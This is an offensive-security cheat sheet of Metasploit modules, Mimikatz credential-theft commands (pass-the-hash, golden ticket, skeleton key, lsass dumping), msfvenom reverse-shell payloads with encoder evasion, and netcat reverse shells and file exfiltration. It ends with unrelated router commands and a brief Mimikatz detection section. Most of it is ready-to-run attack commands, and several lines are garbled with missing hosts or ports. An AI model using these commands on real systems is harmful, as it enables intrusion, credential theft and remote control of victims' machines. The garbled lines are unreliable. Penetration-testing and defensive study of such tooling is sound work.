### Metasploit Commands and Popular Modules

#### Search and Show Commands
- **search**: Searches all exploits, payloads, and auxiliary modules.
- **show exploits**: Displays all available exploits.
- **show payloads**: Lists all available payloads.
- **show auxiliary**: Shows all auxiliary modules, such as scanners.
- **show all**: Displays all available modules.

#### Popular Modules/Exploits
- **auxiliary/scanner/smb/smb_enumshares**: Enumerates SMB shares.
- **auxiliary/scanner/smb/smb_ms17_010**: Detects MS17-010 SMB RCE vulnerability.
- **exploit/windows/smb/ms17_010_eternalblue**: Exploits the MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption.
- **exploit/windows/smb/ms17_010_psexec**: Exploits the MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution.
- **exploit/windows/smb/ms08_067_netapi**: Exploits the MS08-067 Microsoft Server Service Relative Path Stack Corruption.
- **exploit/windows/smb/psexec**: Executes code on a Microsoft Windows authenticated user.
- **exploit/multi/ssh/sshexec**: Executes code via SSH (useful for meterpreter).
- **post/windows/gather/arp_scanner**: Scans ARP tables on Windows.
- **post/windows/gather/enum_applications**: Enumerates installed applications on Windows.
- **run getgui -e**: Enables RDP for a Windows session in meterpreter.

### References
- [Metasploit Cheat Sheet](https://www.tunnelsup.com/metasploit-cheat-sheet/)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [Metasploit Cheat Sheet by Nitescu Lucian](https://nitesculucian.github.io/2018/12/01/metasploit-cheat-sheet/)
- [How to Use Metasploit Behind a NAT or Pivoting and Reverse Tunneling with Meterpreter](https://medium.com/@nikosch86/how-to-metasploit-behind-a-nat-or-pivoting-and-reverse-tunneling-with-meterpreter-1e747e7fa901)

### Mimikatz: Post-Exploitation Tool

Mimikatz is a powerful post-exploitation tool used to extract credentials, hashes, PINs, and Kerberos tickets from memory.

#### Quick Usage
- **log**
- **privilege::debug**
- **sekurlsa::logonpasswords**
- **sekurlsa::tickets /export**
- **sekurlsa::pth /user:Administrator /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd**

#### Kerberos
- **kerberos::list /export**
- **kerberos::ptt c:\chocolate.kirbi**
- **kerberos::golden /admin:administrator /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi**

#### Crypto
- **crypto::capi**
- **crypto::cng**
- **crypto::certificates /export**
- **crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE**
- **crypto::keys /export**
- **crypto::keys /machine /export**

#### Vault and LSADump
- **vault::cred**
- **vault::list**
- **token::elevate**
- **lsadump::sam**
- **lsadump::secrets**
- **lsadump::cache**
- **token::revert**
- **lsadump::dcsync /user:domain\krbtgt /domain:lab.local**

#### Command Descriptions
- **CRYPTO::Certificates**: List/export certificates.
- **KERBEROS::Golden**: Create golden/silver/trust tickets.
- **KERBEROS::List**: List all user tickets (TGT and TGS) in user memory.
- **KERBEROS::PTT**: Pass the ticket, typically used to inject a stolen or forged Kerberos ticket.
- **LSADUMP::DCSync**: Synchronize an object (get password data for account) without running code on the DC.
- **LSADUMP::LSA**: Retrieve SAM/AD enterprise credentials.
- **LSADUMP::SAM**: Get the SysKey to decrypt SAM entries.
- **LSADUMP::Trust**: Retrieve Trust Auth Information.
- **MISC::AddSid**: Add to SIDHistory to a user account.
- **MISC::MemSSP**: Inject a malicious Windows SSP to log locally authenticated credentials.
- **MISC::Skeleton**: Inject Skeleton Key into the LSASS process on a Domain Controller.
- **PRIVILEGE::Debug**: Get debug rights.
- **SEKURLSA::Ekeys**: List Kerberos encryption keys.
- **SEKURLSA::Kerberos**: List Kerberos credentials for all authenticated users.
- **SEKURLSA::Krbtgt**: Get Domain Kerberos service account (KRBTGT) password data.
- **SEKURLSA::LogonPasswords**: List all available provider credentials.
- **SEKURLSA::Pth**: Pass-the-Hash and Over-Pass-the-Hash.
- **SEKURLSA::Tickets**: List all available Kerberos tickets for recently authenticated users.
- **TOKEN::List**: List all tokens of the system.
- **TOKEN::Elevate**: Impersonate a token, used to elevate permissions to SYSTEM or find a domain admin token.

#### Single and Multiple Commands
- **Single Command**:
  ```powershell
  PS C:\temp\mimikatz> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
  ```
- **Multiple Commands**:
  ```powershell
  PS C:\temp\mimikatz> .\mimikatz
  mimikatz # privilege::debug
  mimikatz # sekurlsa::logonpasswords
  mimikatz # sekurlsa::wdigest
  ```

#### Extract Passwords
- **Microsoft disabled lsass clear text storage since Win8.1 / 2012R2+**. It was backported (KB2871997) as a reg key on Win7 / 8 / 2008R2 / 2012 but clear text is still enabled.
  - **mimikatz_command -f sekurlsa::logonPasswords full**
  - **mimikatz_command -f sekurlsa::wdigest**
  - **To re-enable wdigest in Windows Server 2012+**:
    ```powershell
    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1
    ```

#### Pass-The-Hash
- **sekurlsa::pth /user: /domain: /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9**
- **sekurlsa::pth /user: /domain: /ntlm:cc36cf7a8514893efccd332446158b1a /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9**

#### Mini Dump
- **Dump the lsass process**:
  - **HTTP method**:
    ```powershell
    certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
    C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp
    ```
  - **SMB method**:
    ```powershell
    net use Z: https://live.sysinternals.com
    Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
    ```
  - **Load it inside Mimikatz**:
    ```powershell
    mimikatz # sekurlsa::minidump lsass.dmp
    mimikatz # sekurlsa::logonPasswords
    ```

#### Golden Ticket
- **.\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt**
- **Example**:
  ```powershell
  .\mimikatz "kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
  ```

#### Skeleton Key
- **privilege::debug**
- **misc::skeleton**
- **Map the share**:
  ```powershell
  net use p: \\WIN-PTELU2U07KG\admin$ /user:john mimikatz
  rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
  ```

#### RDP Session Takeover
- **Run tscon.exe as the SYSTEM user**:
  ```powershell
  privilege::debug
  token::elevate
  ts::remote /id:2
  query user
  create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"
  net start sesshijack
  ```

#### Credential Manager & DPAPI
- **Check the folder to find credentials**:
  ```powershell
  dir C:\Users\\AppData\Local\Microsoft\Credentials\*
  ```
- **Check the file with mimikatz**:
  ```powershell
  $ mimikatz dpapi::cred /in:C:\Users\\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
  $ mimikatz !sekurlsa::dpapi
  $ mimikatz dpapi::cred /in:C:\Users\\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
  ```

### References
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [PayloadsAllTheThings - Mimikatz](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)
- [ADSecurity.org - Mimikatz](https://adsecurity.org/?page_id=182120)
- [PentestLab - Skeleton Key](https://pentestlab.blog/2018/04/10/skeleton-key/)

### Defending Against Mimikatz

#### Configuration and Hunt
- **Disable Debug Permissions**: Allow only a certain group to have debug permissions.
- **Disable WDigest Protocol**: Don't allow plaintext passwords in LSASS.
- **Enable LSA Protection**: Create registry key RunAsPPL under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA.
- **Restricted Admin Mode**: Create registry keys DisableRestrictedAdmin and DisableRestrictedAdminOutboundCreds.
- **Change Credential Caching to 0**: Set the number of previous logons to cache to zero.
- **Enable Protected Users Group**: Add accounts to the “Protected Users” group.

#### Detect Mimikatz
- **Sysmon Event 10 (Process Accessed)**:
  ```splunk
  EventCode=10 | where (GrantedAccess="0x1010" AND TargetImage LIKE "%lsass.exe")
  ```
- **Windows Event 4656**:
  ```splunk
  EventCode=4656 OR EventCode=4663 | eval HandleReq=case(EventCode=4656 AND Object_Name LIKE "%lsass.exe" AND Access_Mask=="0x143A", Process_ID) | where (HandleReq=Process_ID)
  ```
- **Sysmon Event 1 (ProcessCreate) & Event 10 (ProcessAccessed)**:
  - **Sequence**:
    1. **EventCode=1**: `where (match(ParentImage, "cmd.exe") AND match(IntegrityLevel, "high"))`
    2. **EventCode=10**: `where (match(GrantedAccess, "0x1010") AND !match(SourceImage, "svchost\.exe") AND match(TargetImage, "lsass\.exe"))`

### References
- [Eideon - Mimikatz](https://www.eideon.com/2017-09-09-THL01-Mimikatz/)
- [Preventing Mimikatz Attacks](https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5)

### MsfVenom: Payload Generator

MsfVenom is a standalone payload generator that replaces msfpayload and msfencode.

#### Binaries
- **Windows TCP Payload**:
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={##} -f exe > example.exe
  ```
- **Windows HTTP Payload**:
  ```bash
  msfvenom -p windows/meterpreter/reverse_http LHOST={IP} LPORT={##} -f exe > example.exe
  ```
- **Linux TCP Shell**:
  ```bash
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={IP} LPORT={##} -f elf > example.elf
  ```
- **Mac TCP Shell**:
  ```bash
  msfvenom -p osx/x86/shell_reverse_tcp LHOST={IP} LPORT={##} -f macho > example.macho
  ```
- **Android TCP Payload**:
  ```bash
  msfvenom -p android/meterpreter/reverse/tcp LHOST={IP} LPORT={##} R > example.apk
  ```

#### Web Payloads
- **PHP TCP Shell**:
  ```bash
  msfvenom -p php/meterpreter_reverse_tcp LHOST={IP} LPORT={##} -f raw > example.php
  ```
- **ASP TCP Shell**:
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={##} -f asp > example.asp
  ```
- **JSP TCP Shell**:
  ```bash
  msfvenom -p java/jsp_shell_reverse_tcp LHOST={IP} LPORT={##} -f raw > example.jsp
  ```
- **WAR TCP Shell**:
  ```bash
  msfvenom -p java/jsp_shell_reverse_tcp LHOST={IP} LPORT={##} -f war > example.war
  ```

#### Encoders
- **List all available encoders**:
  ```bash
  msfvenom -l encoders
  ```
- **Bind an exe with a payload**:
  ```bash
  msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={##} -f exe > example.exe
  ```
- **Create a simple TCP payload with shikata_ga_nai encoder**:
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={##} -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f exe > example.exe
  ```
- **Bind an exe with a payload and encode it**:
  ```bash
  msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={##} -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe > example.exe
  ```

#### MacOS Payloads
- **ELF Payload**:
  ```bash
  msfvenom -a x86 --platform OSX -p osx/x86/isight/bind_tcp -b "\x00" -f elf -o /tmp/osxt2
  ```
- **Python Shell**:
  ```bash
  msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.4 LPORT=443 > pyterpreter.py
  ```
- **Mach-O Payload**:
  ```bash
  msfvenom -p osx/x86/shell_reverse_tcp LHOST={IP} LPORT={##} -f macho > example.macho
  ```

### References
- [MsfVenom Cheat Sheet by Nitescu Lucian](https://nitesculucian.github.io/2018/07/24/msfvenom-cheat-sheet/)

### Netcat: Command-Line Utility

Netcat is a versatile command-line tool used for various tasks, including file transfers, remote shells, and more.

#### Port Scan
- **Scan a single port**:
  ```bash
  nc -nvz 192.168.1.23 80
  ```
- **Scan a range of ports**:
  ```bash
  nc -nvz 192.168.1.23 0-1000
  ```

#### Send File
- **Client**:
  ```bash
  nc -lvp  > example_sent.txt
  ```
- **Server**:
  ```bash
  nc -w3  > example_exfil.txt
  ```

#### Execute Remote Script
- **Server**:
  ```bash
  nc -lvp  -e ping.sh
  ```
- **Client**:
  ```bash
  nc -nv
  ```

#### Encrypted Chat (NCAT)
- **Server**:
  ```bash
  ncat -nlvp  --ssl
  ```
- **Client**:
  ```bash
  ncat -nv
  ```

#### Banner Grab
- **Grab banner from a web server**:
  ```bash
  nc www.netmux.com 80
  HEAD / HTTP/1.0
  Host: www.netmux.com
  ```

#### Shells/Reverse Shells
- **Remote shell**:
  ```bash
  nc -e /bin/sh 10.0.0.1
  nc -e /bin/bash 10.0.0.1
  nc -c bash 10.0.0.1
  ```

### Network Device Commands

#### Basic Commands
- **Cisco IOS XR**:
  - **Show commands**: `show`
  - **Exit**: `exit`
  - **Reload**: `reload`
- **Juniper JUNOS**:
  - **Show commands**: `show`
  - **Exit**: `exit`
  - **Reboot**: `request system reboot`
- **Nokia SROS**:
  - **Show commands**: `display`
  - **Exit**: `exit all`
  - **Reboot**: `admin reboot now`
- **Huawei HVRP**:
  - **Show commands**: `display`
  - **Exit**: `return`
  - **Reboot**: `reboot`

#### General Configuration
- **Cisco IOS XR**:
  - **Show running-config**: `show running-config`
  - **Configure terminal**: `configure terminal`
  - **Hostname**: `hostname`
  - **Save configuration**: `commit`
- **Juniper JUNOS**:
  - **Show configuration**: `show configuration`
  - **Configure mode**: `configure`
  - **Hostname**: `system host-name`
  - **Save configuration**: `commit`
- **Nokia SROS**:
  - **Show configuration**: `admin display-config`
  - **Configure mode**: `configure system view`
  - **Hostname**: `sysname`
  - **Save configuration**: `admin save`
- **Huawei HVRP**:
  - **Show current-configuration**: `display current-configuration`
  - **Configure mode**: `system-view`
  - **Hostname**: `sysname`
  - **Save configuration**: `save`

#### Show Commands
- **Cisco IOS XR**:
  - **Show clock**: `show clock`
  - **Show uptime**: `show system uptime`
- **Juniper JUNOS**:
  - **Show clock**: `show system uptime`
- **Nokia SROS**:
  - **Show clock**: `display clock`
- **Huawei HVRP**:
  - **Show clock**: `display clock`

### References
- [Cisco IOS XR Documentation](https://www.cisco.com/c/en/us/support/routers/carrier-routing-system/index.html)
- [Juniper JUNOS Documentation](https://www.juniper.net/documentation/en_US/junos/topics/topic-map/security-screening-junos-os.html)
- [Nokia SROS Documentation](https://www.nokia.com/networks/products-services/routing-optical-networking/sros)
- [Huawei HVRP Documentation](https://support.huawei.com/enterprise/)